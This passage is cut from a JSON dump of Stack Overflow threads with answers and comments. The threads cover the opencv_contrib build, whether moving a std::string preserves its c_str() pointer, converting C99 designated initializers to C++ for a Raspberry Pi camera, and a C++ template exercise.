href=\"https://github.com/Itseez/opencv_contrib\" rel=\"nofollow noreferrer\">opencv_contrib</a> does not even contain the file <code>contrib.hpp</code></p>\n\n<p>How can I simply add the necessary source files to my current build without having to completely rebuild everything?</p>\n"}, {"tags": ["c++", "c++11", "move", "move-semantics"], "comments": [{"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "edited": false, "score": 5, "creation_date": 1429730047, "post_id": 29806718, "comment_id": 47741584, "body": "<code>std::move</code> is just a cast. It doesn&#39;t <i>do</i> anything."}, {"owner": {"reputation": 7865, "user_id": 2331956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ede184a71447fbba327ad6190c079888?s=128&d=identicon&r=PG", "display_name": "Mike Vine", "link": "https://stackoverflow.com/users/2331956/mike-vine"}, "edited": false, "score": 0, "creation_date": 1429731525, "post_id": 29806718, "comment_id": 47742537, "body": "I&#39;m not convinced that subsequent calls to .c_str() are guaranteed to return the <i>same pointer</i> even without the attempted move. It would be a weird thing for the standard to require that (even an implicit requirement) although I&#39;d love a language lawyer to quote me the standard. (I know it would have to be a <i>really weird</i> implementation that did this though)"}, {"owner": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "reply_to_user": {"reputation": 7865, "user_id": 2331956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ede184a71447fbba327ad6190c079888?s=128&d=identicon&r=PG", "display_name": "Mike Vine", "link": "https://stackoverflow.com/users/2331956/mike-vine"}, "edited": false, "score": 0, "creation_date": 1429731797, "post_id": 29806718, "comment_id": 47742729, "body": "@MikeVine it can clearly not be expected to return the same pointer between changes. For example if the string size was increased arbitrarily. If nothing is said about it in the standard, then any non-const method is free to influence this."}, {"owner": {"reputation": 7865, "user_id": 2331956, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ede184a71447fbba327ad6190c079888?s=128&d=identicon&r=PG", "display_name": "Mike Vine", "link": "https://stackoverflow.com/users/2331956/mike-vine"}, "reply_to_user": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "edited": false, "score": 0, "creation_date": 1429732094, "post_id": 29806718, "comment_id": 47742899, "body": "@Johan Lundberg Its not even that. I could think of a string implementation (lets say one which stores the string twice, stupid I know but I think its standard compliant) that could return a different pointer from c_str() if called twice without modification. At least I think this is ok, but like I said I&#39;d like to see something from the standard which disallows this. Purely for interest ofc."}, {"owner": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "edited": false, "score": 0, "creation_date": 1429732478, "post_id": 29806718, "comment_id": 47743127, "body": "Remember that const means thread safe, so unless such hypothetical implementation protects that whole thing it&#39;s not allowed."}, {"owner": {"reputation": 8289, "user_id": 391806, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/88a2ea78dadbdaf73e1033fe7cbdeb73?s=128&d=identicon&r=PG", "display_name": "Dale Wilson", "link": "https://stackoverflow.com/users/391806/dale-wilson"}, "edited": false, "score": 0, "creation_date": 1429737263, "post_id": 29806718, "comment_id": 47746017, "body": "consider using string::swap rather than move.  It&#39;s much more likely to leave the data in the same place (but no, it is not guaranteed)"}, {"owner": {"reputation": 8289, "user_id": 391806, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/88a2ea78dadbdaf73e1033fe7cbdeb73?s=128&d=identicon&r=PG", "display_name": "Dale Wilson", "link": "https://stackoverflow.com/users/391806/dale-wilson"}, "reply_to_user": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "edited": false, "score": 0, "creation_date": 1429737370, "post_id": 29806718, "comment_id": 47746084, "body": "@JohanLundberg   Alas, const does not always mean threadsafe.  You&#39;d have to look at the implementation of the class to be sure of that -- as one example &quot;mutable&quot; preserves logical, but not physical constness, and is definately not threadsafe."}, {"owner": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "edited": false, "score": 1, "creation_date": 1429737964, "post_id": 29806718, "comment_id": 47746405, "body": "C++ standard library classes and functions are thread safe in that they allow access to const methods without external synchronization. Const methods are allowed to mutate internal states (mutable or cast away const) only if it can be done by still preserving correct behavior (atomic or otherwise synchronized if it has to be), or as-if. <a href=\"http://herbsutter.com/2013/01/01/video-you-dont-know-const-and-mutable/\" rel=\"nofollow noreferrer\">herbsutter.com/2013/01/01/video-you-dont-know-const-and-muta&zwnj;&#8203;ble</a>"}, {"owner": {"reputation": 847, "user_id": 6469690, "user_type": "registered", "accept_rate": 0, "profile_image": "https://i.stack.imgur.com/kvGyE.png?s=128&g=1", "display_name": "Bonita Montero", "link": "https://stackoverflow.com/users/6469690/bonita-montero"}, "edited": false, "score": 0, "creation_date": 1572772089, "post_id": 29806718, "comment_id": 103657691, "body": "C++-strings usually have small-string-optimizations. If c_str would be the same for a moved string, small-string-optimizations wouldn&#39;t be possible because of the internal buffers of the string-objects have different adresses. So take it the opposite way: if the standard would mandate .c_str() to be the same across moved strings, small-string-optimizations wouldn&#39;t be possible."}], "answers": [{"comments": [{"owner": {"reputation": 102, "user_id": 1973207, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/557d7fa74d7ec23c6726f1c16986b032?s=128&d=identicon&r=PG", "display_name": "DuckQueen", "link": "https://stackoverflow.com/users/1973207/duckqueen"}, "edited": false, "score": 0, "creation_date": 1429737495, "post_id": 29806766, "comment_id": 47746164, "body": "So in case of for example std::vector we are garanteed to have  pointer to the first oiunt to the same place after move?"}, {"owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "reply_to_user": {"reputation": 102, "user_id": 1973207, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/557d7fa74d7ec23c6726f1c16986b032?s=128&d=identicon&r=PG", "display_name": "DuckQueen", "link": "https://stackoverflow.com/users/1973207/duckqueen"}, "edited": false, "score": 0, "creation_date": 1429752163, "post_id": 29806766, "comment_id": 47751690, "body": "@DuckQueen: I&#39;m not really sure. The standard says that the target container after move has the same value as the operand before the move, but that&#39;s a bit vague. Only for <code>swap</code> does it say that no container elements are touched."}], "tags": [], "owner": {"reputation": 426981, "user_id": 596781, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/a18405dd4b022837867d1f5453a05f41?s=128&d=identicon&r=PG", "display_name": "Kerrek SB", "link": "https://stackoverflow.com/users/596781/kerrek-sb"}, "is_accepted": false, "score": 10, "last_activity_date": 1429730233, "last_edit_date": 1429730233, "creation_date": 1429729745, "answer_id": 29806766, "question_id": 29806718, "link": "https://stackoverflow.com/questions/29806718/does-stdmove-on-stdstring-garantee-that-c-str-returns-same-result/29806766#29806766", "title": "Does std::move on std::string garantee that .c_str() returns same result?", "body": "<p>No. There's no requirement for <code>std::string</code> to use dynamic allocation or to do anything specific with such an allocation if it has one. In fact, modern implementations usually put short strings into the string object itself and don't allocate anything; then moving is the same as copying.</p>\n\n<p>It's important to keep in mind that <code>std::string</code> is <em>not</em> a container, even though it looks very similar to one. Containers make stronger guarantees with respect to their elements than <code>std::string</code> does.</p>\n"}, {"tags": [], "owner": {"reputation": 435402, "user_id": 179910, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d8962238339d771f0348967be6f97b1b?s=128&d=identicon&r=PG", "display_name": "Jerry Coffin", "link": "https://stackoverflow.com/users/179910/jerry-coffin"}, "is_accepted": false, "score": 7, "last_activity_date": 1429729862, "creation_date": 1429729862, "answer_id": 29806797, "question_id": 29806718, "link": "https://stackoverflow.com/questions/29806718/does-stdmove-on-stdstring-garantee-that-c-str-returns-same-result/29806797#29806797", "title": "Does std::move on std::string garantee that .c_str() returns same result?", "body": "<p>No, it's not guaranteed.</p>\n\n<p>Guaranteeing it would basically prohibit (for one example) the short string optimization, in which the entire body of a short string is stored in the string object itself, rather than being allocated separately on the heap.</p>\n\n<p>At least for now, I think SSO is regarded as important enough that the committee would be extremely reluctant to prohibit it (but that could change--when the original C++98 standard was written, they went to considerable trouble to allow copy-on-write strings, but they are now prohibited).</p>\n"}, {"comments": [{"owner": {"reputation": 102, "user_id": 1973207, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/557d7fa74d7ec23c6726f1c16986b032?s=128&d=identicon&r=PG", "display_name": "DuckQueen", "link": "https://stackoverflow.com/users/1973207/duckqueen"}, "edited": false, "score": 0, "creation_date": 1429736509, "post_id": 29807037, "comment_id": 47745617, "body": "How to put a string into unique_ptr.having it by value?"}], "tags": [], "owner": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "is_accepted": true, "score": 3, "last_activity_date": 1429737818, "last_edit_date": 1429737818, "creation_date": 1429730699, "answer_id": 29807037, "question_id": 29806718, "link": "https://stackoverflow.com/questions/29806718/does-stdmove-on-stdstring-garantee-that-c-str-returns-same-result/29807037#29807037", "title": "Does std::move on std::string garantee that .c_str() returns same result?", "body": "<p>No,</p>\n\n<p>but if that is needed, an option is to put the string in <code>std::unique_ptr</code>. Personally I would typically not rely on the c_str() value for more than the local scope.</p>\n\n<p>Example, on request:</p>\n\n<pre><code>#include &lt;iostream&gt;\n#include &lt;string&gt;\n#include &lt;memory&gt;\n\nint main() {\n    std::string ss(\"hello\");\n    auto u_str = std::make_unique&lt;std::string&gt;(ss);\n    std::cout &lt;&lt; u_str-&gt;c_str() &lt;&lt;std::endl;\n    std::cout &lt;&lt; *u_str &lt;&lt;std::endl;\n    return 0;\n}\n</code></pre>\n\n<p>if you don't have make_unique (new in C++14). </p>\n\n<pre><code>auto u_str = std::unique_ptr&lt;std::string&gt;(new std::string(ss));\n</code></pre>\n\n<p>Or just copy the whole implementation from the <a href=\"https://isocpp.org/files/papers/n3588.txt\" rel=\"nofollow\">proposal by S.T.L.:</a></p>\n\n<p><a href=\"http://ideone.com/dNxCJf\" rel=\"nofollow\">Ideone example on how to do that</a></p>\n"}], "owner": {"reputation": 102, "user_id": 1973207, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/557d7fa74d7ec23c6726f1c16986b032?s=128&d=identicon&r=PG", "display_name": "DuckQueen", "link": "https://stackoverflow.com/users/1973207/duckqueen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1192, "favorite_count": 2, "accepted_answer_id": 29807037, "answer_count": 3, "score": 6, "last_activity_date": 1429737818, "creation_date": 1429729606, "question_id": 29806718, "link": "https://stackoverflow.com/questions/29806718/does-stdmove-on-stdstring-garantee-that-c-str-returns-same-result", "title": "Does std::move on std::string garantee that .c_str() returns same result?", "body": "<p>I want to provide zero-copy, move based API. I want to move a string from thread A into thread B. Ideologically it seems that move shall be able to simply pass\\move data from instance A into new instance B with minimal to none copy operations (mainly for addresses). So all data like data pointers will be simply copied no new instance (constructed via move). So does std::move on std::string garantee that .c_str() returns same result on instance before move and instance created via move constructor?</p>\n"}, {"tags": ["c++", "c", "linux", "opencv", "raspberry-pi"], "comments": [{"owner": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "edited": false, "score": 3, "creation_date": 1429729381, "post_id": 29806609, "comment_id": 47741150, "body": "This is a C99 feature and is not available in C++ as written. You would just instantiate your <code>struct</code> variable, then assign to the named members afterwards, you cannot initialize using the name members as written."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "reply_to_user": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "edited": false, "score": 0, "creation_date": 1429729547, "post_id": 29806609, "comment_id": 47741256, "body": "@Cyber Does that question explain how to do the equivalent in C++? If not, it&#39;s not a duplicate."}, {"owner": {"user_type": "does_not_exist", "display_name": "user2249683"}, "edited": false, "score": 0, "creation_date": 1429729568, "post_id": 29806609, "comment_id": 47741268, "body": "You should not convert working C-code. I suggest wrapping the C-code with C++ (if it has development/maintenance benefits)"}, {"owner": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "reply_to_user": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1429729577, "post_id": 29806609, "comment_id": 47741280, "body": "@Barmar No it doesn&#39;t, but if they understand what it is doing, they&#39;ll know how to do it in C++. Especially since I explained it in the comment following the duplicate link."}, {"owner": {"reputation": 589605, "user_id": 1491895, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/82f9e178a16364bf561d0ed4da09a35d?s=128&d=identicon&r=PG", "display_name": "Barmar", "link": "https://stackoverflow.com/users/1491895/barmar"}, "edited": false, "score": 0, "creation_date": 1429729665, "post_id": 29806609, "comment_id": 47741352, "body": "That&#39;s quite an assumption from someone who&#39;s been here as long as you have :)"}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1429731088, "post_id": 29806609, "comment_id": 47742236, "body": "The duplicate does not explain how to do this in C++, reopening."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "edited": false, "score": 0, "creation_date": 1429732303, "post_id": 29806609, "comment_id": 47743029, "body": "@Cyber : But that is neither the only or even the best method of initialising structure members in C++, and comments are not intended for posting answers in any case.  By closing the question down you got your &quot;answer&quot; in in a comment then prevented anyone else from posting an answer in the correct manner"}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 1, "creation_date": 1429732543, "post_id": 29806609, "comment_id": 47743171, "body": "@DieterL&#252;cking : I would say &quot;need not&quot; rather than &quot;should not&quot;, but it is a worthwhile point to make that C and C++ are interoperable, and it is often a waste of effort to &quot;convert&quot; C code rather then simply using it as-is, as you risk changing the semantics in ways that are not always obvious.  And of course because C99 has diverged from C++ so it may just be hard work."}, {"owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "reply_to_user": {"reputation": 96896, "user_id": 2296458, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/wbG2s.png?s=128&g=1", "display_name": "Cory Kramer", "link": "https://stackoverflow.com/users/2296458/cory-kramer"}, "edited": false, "score": 0, "creation_date": 1429734070, "post_id": 29806609, "comment_id": 47744119, "body": "@Cyber: Your suggestion is not a method of <i>initializing</i> members at all.  There&#39;s a world of difference between initialization and assignment (even in C -- you cannot put those <i>assignment statements</i> outside of a function, though that appears not to be an issue in this specific case)"}, {"owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "reply_to_user": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1429734195, "post_id": 29806609, "comment_id": 47744204, "body": "@Clifford: And then it is a duplicate after all."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1429778971, "post_id": 29806609, "comment_id": 47763285, "body": "@BenVoigt : It is a duplicate of the question you have identified - it was <i>not</i> a duplicate of the <a href=\"http://stackoverflow.com/questions/8047261/what-does-dot-mean-in-a-struct-initializer\">question previously identified</a> by Cyber as its duplicate."}], "answers": [{"comments": [{"owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1429734090, "post_id": 29807186, "comment_id": 47744136, "body": "Aggregate initialization still works just fine in C++."}, {"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "reply_to_user": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1429778400, "post_id": 29807186, "comment_id": 47762891, "body": "@BenVoigt :  I have not said otherwise (although I edited to clarify - perhaps you are referring ot the pre-edited text?); you answer remains valid - I have chosen not to duplicate it.  I would suggest that C99 has named member initialisation because it does not have constructors, and equally C++ does not have named member initialisation <i>because</i> it does have constructors.  I am simply stating this method as the C++ method of selective member initialisation."}], "tags": [], "owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "is_accepted": true, "score": 1, "last_activity_date": 1429779538, "last_edit_date": 1429779538, "creation_date": 1429731236, "answer_id": 29807186, "question_id": 29806609, "link": "https://stackoverflow.com/questions/29806609/converting-code-from-c-to-c/29807186#29807186", "title": "Converting code from c to c++", "body": "<p>The named structure member initialisation in C99 is not implemented in C++.  In C++ you can perform member initialisation using a constructor.  E.g:</p>\n\n<pre><code>struct sConfig \n{\n    int m_x ;\n    int m_y ;\n\n    sConfig( int x, int y ) : m_x(x),\n                              m_y(y)\n    {}\n} ;\n</code></pre>\n\n<p>Or:</p>\n\n<pre><code>struct sConfig \n{\n    int m_x ;\n    int m_y ;\n\n    sConfig( int x, int y )\n    {\n        m_x = x ;\n        m_y = y ;\n    }\n} ;\n</code></pre>\n\n<p>or even a combination of the two methods.  Then you instantiate an object thus:</p>\n\n<pre><code>sConfig myConfig( 10, 20 ) ;\n</code></pre>\n\n<p>Initialising <code>m_x</code> and <code>m_y</code> to 10 and 20 respectively in this example.</p>\n\n<p>You can then of course only perform the initialisation provided by the structures defined constructors; but that is not necessarily a bad thing - letting the user arbitrarily decide which members to initialise is not particularly safe or maintainable.  You can of course define multiple constructors to perform different initialisations; you would normally want define a default constructor for example:</p>\n\n<pre><code>struct sConfig \n{\n    int m_x ;\n    int m_y ;\n\n    sConfig( int x, int y ) : m_x(x),\n                              m_y(y)\n    {}\n\n    sConfig( ) : m_x(0),\n                 m_y(0)\n    {}\n} ;\n</code></pre>\n\n<p>So that in this example:</p>\n\n<pre><code>sConfig myConfig ;\n</code></pre>\n\n<p>is equivalent to all of the following:</p>\n\n<pre><code>sConfig myConfig( 0, 0 ) ;\nsConfig myConfig = { 0, 0 } ;\nsConfig myConfig = {0} ;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 76010, "user_id": 168986, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/MqorX.jpg?s=128&g=1", "display_name": "Clifford", "link": "https://stackoverflow.com/users/168986/clifford"}, "edited": false, "score": 0, "creation_date": 1429778669, "post_id": 29807199, "comment_id": 47763085, "body": "C++ supports named initialisers using a different syntax via constructor initialiser lists."}], "tags": [], "owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "is_accepted": false, "score": 2, "last_activity_date": 1429731270, "creation_date": 1429731270, "answer_id": 29807199, "question_id": 29806609, "link": "https://stackoverflow.com/questions/29806609/converting-code-from-c-to-c/29807199#29807199", "title": "Converting code from c to c++", "body": "<p>C++ doesn't support named initializers, only positional ones.</p>\n\n<p>You'll have to read the <code>struct</code> definition and arrange all the initializers into declaration order.</p>\n\n<p>Any members which weren't being named in the C code were being initialized to zero implicitly.  You may have to make some of them explicit in order to not skip positions.</p>\n\n<p>If this code is from <a href=\"http://www.jvcref.com/files/PI/documentation/html/struct_m_m_a_l___p_a_r_a_m_e_t_e_r___c_a_m_e_r_a___c_o_n_f_i_g___t.html\" rel=\"nofollow\">JVCleave</a> then it appears that the members are already in the correct order, you can just comment out the names and it will still work.</p>\n"}], "owner": {"reputation": 256, "user_id": 3397436, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/27e8ba40a23a05c85c114f2dc61ee21f?s=128&d=identicon&r=PG&f=1", "display_name": "Matthew", "link": "https://stackoverflow.com/users/3397436/matthew"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 176, "favorite_count": 0, "closed_date": 1429734174, "accepted_answer_id": 29807186, "answer_count": 2, "score": 0, "last_activity_date": 1429779538, "creation_date": 1429729276, "last_edit_date": 1429732107, "question_id": 29806609, "link": "https://stackoverflow.com/questions/29806609/converting-code-from-c-to-c", "closed_reason": "Duplicate", "title": "Converting code from c to c++", "body": "<p>I'm trying to convert some code from C to C++\nThis is a project using a raspberry pi with camera module and I'd like to analyse pictures with it.</p>\n\n<p>But on this piece of code (somebody else created) I get this error</p>\n\n<pre><code>231:8: error: expected primary-expression before \u2018.\u2019 token\n</code></pre>\n\n<p>Which is this line:</p>\n\n<pre><code>.max_stills_w = state-&gt;width,\n</code></pre>\n\n<p>I tried everything I could find but it keeps giving me other errors</p>\n\n<pre><code>    video_port = camera-&gt;output[MMAL_CAMERA_VIDEO_PORT];\n    still_port = camera-&gt;output[MMAL_CAMERA_CAPTURE_PORT];\n\n    //  set up the camera configuration\n    {\n       MMAL_PARAMETER_CAMERA_CONFIG_T cam_config =\n       {\n          { MMAL_PARAMETER_CAMERA_CONFIG, sizeof(cam_config) },\n          .max_stills_w = state-&gt;width,\n          .max_stills_h = state-&gt;height,\n          .stills_yuv422 = 0,\n          .one_shot_stills = 0,\n          .max_preview_video_w = state-&gt;width,\n          .max_preview_video_h = state-&gt;height,\n          .num_preview_video_frames = 3,\n          .stills_capture_circular_buffer_height = 0,\n          .fast_preview_resume = 0,\n          .use_stc_timestamp = MMAL_PARAM_TIMESTAMP_MODE_RESET_STC\n       };\n       mmal_port_parameter_set(camera-&gt;control, &amp;cam_config.hdr);\n    }\n    // Set the encode format on the video  port\n</code></pre>\n"}, {"tags": ["c++", "function", "class", "templates"], "comments": [{"owner": {"reputation": 11458, "user_id": 3435400, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/61726fe80facc93d76754f0226b49eb9?s=128&d=identicon&r=PG&f=1", "display_name": "alain", "link": "https://stackoverflow.com/users/3435400/alain"}, "edited": false, "score": 3, "creation_date": 1429728899, "post_id": 29806466, "comment_id": 47740837, "body": "since you&#39;re not using <code>T</code>, you can just delete the <code>template&lt;class T&gt;</code> line"}, {"owner": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "edited": false, "score": 0, "creation_date": 1429729133, "post_id": 29806466, "comment_id": 47740985, "body": "modifying the code to look like this <code>void ROI(T np, T ci)</code> and <code>void ATR(T ca, T inv, T cl)</code> doesn&#39;t fix the errors that appear to be coming through in main."}, {"owner": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1429729450, "post_id": 29806466, "comment_id": 47741193, "body": "@YelizavetaYR There&#39;s other dependent code you&#39;re not showing here."}, {"owner": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "reply_to_user": {"reputation": 83072, "user_id": 1413395, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/6wNQa.jpg?s=128&g=1", "display_name": "\u03c0\u03ac\u03bd\u03c4\u03b1 \u1fe5\u03b5\u1fd6", "link": "https://stackoverflow.com/users/1413395/%cf%80%ce%ac%ce%bd%cf%84%ce%b1-%e1%bf%a5%ce%b5%e1%bf%96"}, "edited": false, "score": 0, "creation_date": 1429729525, "post_id": 29806466, "comment_id": 47741244, "body": "@\u03c0\u03ac\u03bd\u03c4\u03b1\u1fe5\u03b5\u1fd6 there are many other functions, but all are semi-independent. The assignment is to create a series of template classes that can use any passed data type. which is what i&#39;m trying to do with the ROI and ATR functions only"}], "answers": [{"comments": [{"owner": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": "https://www.gravatar.com/avatar/9d1bf8d92bb2a0f4abe6f818c6dfce58?s=128&d=identicon&r=PG&f=1", "display_name": "YelizavetaYR", "link": "https://stackoverflow.com/users/3532205/yelizavetayr"}, "edited": false, "score": 0, "creation_date": 1429729397, "post_id": 29806503, "comment_id": 47741161, "body": "Can you please explain what this means - as I understand in order to template a the data types you need to add this line <code>template &lt;class T&gt;</code> of code and then use T, with or without the T definitions the code doesn&#39;t work."}, {"owner": {"reputation": 23041, "user_id": 1149664, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/ac4f96b553d2e45776bd6235fee4222d?s=128&d=identicon&r=PG", "display_name": "Johan Lundberg", "link": "https://stackoverflow.com/users/1149664/johan-lundberg"}, "reply_to_user": {"reputation": 1443, "user_id": 3532205, "user_type": "registered", "accept_rate": 96, "profile_image": 